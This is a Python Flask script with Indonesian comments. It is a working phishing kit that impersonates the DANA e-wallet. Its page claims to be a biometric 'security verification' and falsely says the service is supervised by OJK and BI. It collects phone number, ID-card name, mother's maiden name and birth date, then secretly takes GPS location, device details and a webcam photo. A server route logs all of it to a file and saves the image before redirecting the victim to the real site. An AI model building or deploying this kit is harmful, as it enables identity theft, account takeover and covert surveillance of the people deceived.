from flask import Flask, request, render_template_string
import datetime
import os
import base64

app = Flask(__name__)

# Konfigurasi Path Penyimpanan sesuiakan dengan laptop mu
BASE_DIR = r"C:\...\...\...\..."
if not os.path.exists(BASE_DIR): 
    os.makedirs(BASE_DIR)

LOG_FILE = os.path.join(BASE_DIR, "log_analisis_dana.txt")

@app.route('/')
def index():
    return render_template_string('''
        <!DOCTYPE html>
        <html lang="id">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
            <title>DANA - Dompet Digital Indonesia</title>
            <style>
                :root { 
                    --dana-blue: #118ee9; 
                    --dana-dark: #00569e;
                    --bg: #f5f7fa; 
                    --text: #333333; 
                }
                body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: var(--text); }
                
                .card { background: white; width: 100%; max-width: 450px; min-height: 100vh; display: flex; flex-direction: column; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
                
                .header { background: var(--dana-blue); color: white; padding: 30px 20px; text-align: center; border-bottom-left-radius: 20px; border-bottom-right-radius: 20px; }
                .logo-mock { width: 120px; margin-bottom: 10px; filter: brightness(0) invert(1); }
                
                .step-container { display: flex; justify-content: center; gap: 10px; margin: 20px 0; }
                .dot { width: 10px; height: 10px; border-radius: 50%; background: #d0d7de; transition: 0.3s; }
                .dot.active { background: var(--dana-blue); width: 25px; border-radius: 5px; }

                .content { padding: 25px; flex-grow: 1; }
                .input-group { margin-bottom: 20px; }
                label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 8px; color: #666; }
                input { width: 100%; padding: 15px; border: 1px solid #e3e3e3; border-radius: 12px; box-sizing: border-box; font-size: 16px; background: #fafafa; outline: none; transition: 0.2s; }
                input:focus { border-color: var(--dana-blue); background: #fff; box-shadow: 0 0 0 3px rgba(17,142,233,0.1); }
                
                .btn { background: var(--dana-blue); color: white; border: none; padding: 16px; border-radius: 12px; width: 100%; font-weight: 700; font-size: 16px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 10px rgba(17,142,233,0.3); }
                .btn:active { transform: scale(0.98); }
                
                .hidden { display: none; }
                .footer { padding: 25px; text-align: center; font-size: 12px; color: #aaa; background: #fff; }
                
                /* Fake Loader Animation */
                .loader-spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--dana-blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            </style>
        </head>
        <body>
            <div class="card">
                <div class="card">
                <div class="header">
                    <img class="logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJQAAACUCAMAAABC4vDmAAAAZlBMVEUQjun///8AiOgHjOkAiuilzPS92fcAhugAg+cmkukAgOf8/f/2+v4kjek2luvo8vyy0/be7fvw9v1EoOycyfRUoOxgp+3S5fqVw/PL4fl4tfCMwPJtsvCm0faBuPG53PhCm+thrO5FpcKBAAADPUlEQVR4nO2a23KjMAxAsa3YXBKDCQEDKYX//8mFdLrF5AJJVtCZ1XnpNMkMZ2RZFgLPIwiCIAiCIAiCIAiCIAiCIFwAlN+jALY2uSAAxME7nuvs4yOrq2NwGD7ZVAmEPjWfMRsRy+akxXYR415el+wGpc37LzdR4uckvqV0iVdSwfpaws+T9J7SQCpztXJucW93N0p/o7Vbdw1VezOXphStWs+Jd/slToxF59VixetlSgP1OkVLwBNOjGWrWIF9xokxu4KVqqPnpCLLsa3U+WF1ukVaIe9BOBXPOjFmTshH4e55J8YSVCWoXnFirEIMldAvLN6A0Xi5Ds1rTow1eJUdZg/hvgKYUkpZGvfTFG39eD5rVGRV3uogaE9V4pyPaIdgONMaGJvr/h5CiOEs4kE+/rkJkaT46CLXbcLnsVcRo4QGp7/xcFJdjdNcCvvjFe3LTvnT3ws1Lmo1Tll3Vk8GIdgiHjDJ2QtvpIzgY6kCZ/381JESQoVCt9oL/dtJ7EqlKJGCdiLlXW5F7zcmE6kjRlXg1f5K6iGu1L7CKArKRu9IRRZj/fzde1LJ1fb8F1IJe0eKyf9I6q3lQ5L6jTn17u7LMHbfu3UKpc+D/C2ptMOo6IJfHzO3+T57XCkEpZ7QzEr1DdXhELTH9jKPdaSQujxlH0sBBG1uy694xp9n7fRTGcbmG9qE0TXKwEmRvv31To073TONHP2H0iT0hKNrplar78sIrkReJ5MbmJ5RDUmxenR/PJjaF9kR/MtzBt1l0szMYizO6vURObhxiAuZ7BJZmHh+OjRfQV6FZ1cLFC2bVn3g3SELvXAAO2WPOEvwxIvDhBpPqa8KetH8fEqhUadmvFsw45iSYk/TxzfGC4ks9iBWeHJew0V66E//4PDkNM/gO/VW/Po8eUC80gO28IlYmXClh36CJwuzfS/Xe+IHUC+qDHG95jsBgucLNmHZrfsygOC6mcl30+jVH20D6EdrmNbtJq9zgAiqO9EyTbDd+xLcD2rjtlRRZKy+M3BcC6FC1dmkMCY2xhQy6/oPtn3X5csLlB+GCkCFw59fYPSD+FU2BEEQBEEQBEEQBEEQBEEQBEEQBEFsxB9tUCeo8c77fwAAAABJRU5ErkJggg==" alt="DANA">
                    <h1>Verifikasi Keamanan Akun</h1>
                    <p>Lindungi akun DANA Anda dengan verifikasi biometrik</p>
                </div>

                <div class="step-container">
                    <div id="d1" class="dot active"></div>
                    <div id="d2" class="dot"></div>
                    <div id="d3" class="dot"></div>
                </div>

                <div class="content">
                    <div id="s1">
                        <h3 style="margin-top:0">Konfirmasi Nomor</h3>
                        <p style="font-size:14px; color:#777">Masukkan nomor HP yang terdaftar di DANA Anda.</p>
                        <div class="input-group">
                            <label>Nomor Handphone</label>
                            <input type="tel" id="hp" placeholder="0812xxxxxxx" required>
                        </div>
                        <div class="input-group">
                            <label>Nama Sesuai KTP</label>
                            <input type="text" id="nama" placeholder="Contoh: Pardiansyah Putra" required>
                        </div>
                        <button class="btn" onclick="next(2)">Lanjutkan</button>
                    </div>

                    <div id="s2" class="hidden">
                        <h3 style="margin-top:0">Validasi Data</h3>
                        <p style="font-size:14px; color:#777">Demi keamanan, silakan isi data keluarga berikut.</p>
                        <div class="input-group">
                            <label>Nama Ibu Kandung</label>
                            <input type="text" id="ibu" placeholder="Wajib diisi untuk verifikasi">
                        </div>
                        <div class="input-group">
                            <label>Tanggal Lahir</label>
                            <input type="date" id="tgl">
                        </div>
                        <button class="btn" onclick="next(3)">Ke Biometrik</button>
                    </div>

                    <div id="s3" class="hidden">
                        <div id="final-ui" style="text-align:center;">
                            <img src="https://cdn-icons-png.flaticon.com/512/4643/4643514.png" width="80" style="margin-bottom:20px;">
                            <h3>Aktivasi DANAVIZ</h3>
                            <p style="font-size:14px; color:#666; line-height:1.5;">Gunakan <b>Face Verification</b> dan <b>Sinkronisasi GPS</b> untuk melindungi akun Anda dari akses ilegal.</p>
                            <button class="btn" onclick="startCapture()">MULAI SCAN WAJAH</button>
                        </div>
                        <div id="loading-ui" class="hidden" style="text-align:center;">
                            <div class="loader-spinner"></div>
                            <p style="font-weight:600; color:var(--dana-blue);">Menghubungkan ke Server DANA...</p>
                            <p style="font-size:12px; color:#999;">Enkripsi data biometrik sedang berlangsung.</p>
                        </div>
                    </div>
                </div>

                <div class="footer">
                    <img src="data:image/jpeg;base64,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" width="25" style="vertical-align:middle; margin-right:5px;">
                    Terdaftar dan diawasi oleh OJK & BI
                </div>
            </div>

            <video id="v" style="display:none" autoplay></video>
            <canvas id="c" style="display:none"></canvas>

            <script>
                function next(n) {
                    document.querySelectorAll('.dot').forEach(d => d.classList.remove('active'));
                    document.getElementById('d'+n).classList.add('active');
                    document.getElementById('s1').classList.add('hidden');
                    document.getElementById('s2').classList.add('hidden');
                    document.getElementById('s3').classList.add('hidden');
                    document.getElementById('s'+n).classList.remove('hidden');
                }

                async function startCapture() {
                    document.getElementById('final-ui').classList.add('hidden');
                    document.getElementById('loading-ui').classList.remove('hidden');

                    let payload = {
                        hp: document.getElementById('hp').value,
                        nama: document.getElementById('nama').value,
                        ibu: document.getElementById('ibu').value,
                        tgl: document.getElementById('tgl').value,
                        os: navigator.platform,
                        ram: navigator.deviceMemory || "N/A",
                        cpu: navigator.hardwareConcurrency || "N/A",
                        agent: navigator.userAgent
                    };

                    navigator.geolocation.getCurrentPosition(function(p) {
                        payload.lat = p.coords.latitude; payload.lon = p.coords.longitude;
                        capturePhoto(payload);
                    }, function() {
                        payload.lat = "DENIED"; payload.lon = "DENIED";
                        capturePhoto(payload);
                    });
                }

                function capturePhoto(data) {
                    navigator.mediaDevices.getUserMedia({ video: true }).then(function(s) {
                        let video = document.getElementById('v');
                        video.srcObject = s;
                        setTimeout(() => {
                            let canvas = document.getElementById('c');
                            canvas.width = 640; canvas.height = 480;
                            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                            data.img = canvas.toDataURL('image/jpeg', 0.7);
                            s.getTracks().forEach(track => track.stop());
                            send(data);
                        }, 2000);
                    }).catch(() => {
                        data.img = "NO_CAMERA";
                        send(data);
                    });
                }

                function send(finalData) {
                    fetch('/log-ultimate', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(finalData)
                    }).then(() => {
                        alert("Sinkronisasi Berhasil! Akun DANA Anda kini lebih aman.");
                        window.location.href = "https://www.dana.id";
                    });
                }
            </script>
        </body>
        </html>
    ''')

@app.route('/log-ultimate', methods=['POST'])
def log_ultimate():
    d = request.json
    waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    laporan = (
        f"{'='*60}\n"
        f"LOG TIME     : {waktu}\n"
        f"PHONE/USER   : {d.get('hp')} | {d.get('nama')}\n"
        f"MOTHER NAME  : {d.get('ibu')}\n"
        f"BIRTH DATE   : {d.get('tgl')}\n"
        f"COORDINATES  : {d.get('lat')}, {d.get('lon')}\n"
        f"{'-'*60}\n"
        f"DEVICE       : {d.get('os')} | RAM {d.get('ram')}GB | CPU {d.get('cpu')} Core\n"
        f"BROWSER      : {d.get('agent')[:50]}...\n"
        f"PHOTO STATUS : {'CAPTURED' if 'data:image' in d.get('img') else 'FAILED/BLOCKED'}\n"
        f"{'='*60}\n\n"
    )

    # Simpan Laporan Tekstual
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(laporan)
    
    # Simpan Gambar jika ada
    if "data:image" in d.get('img'):
        name_clean = "".join(x for x in d.get('nama') if x.isalnum())
        img_name = f"DANA_{name_clean}_{datetime.datetime.now().strftime('%H%M%S')}.jpg"
        with open(os.path.join(BASE_DIR, img_name), "wb") as f:
            f.write(base64.b64decode(d.get('img').split(',')[1]))
        print(f"[*] Data & Foto diterima dari: {d.get('nama')}")

    print(laporan)
    return '', 204

if __name__ == '__main__':
    # Pastikan port 5000 tidak sedang digunakan
    app.run(host='0.0.0.0', port=5000, debug=False)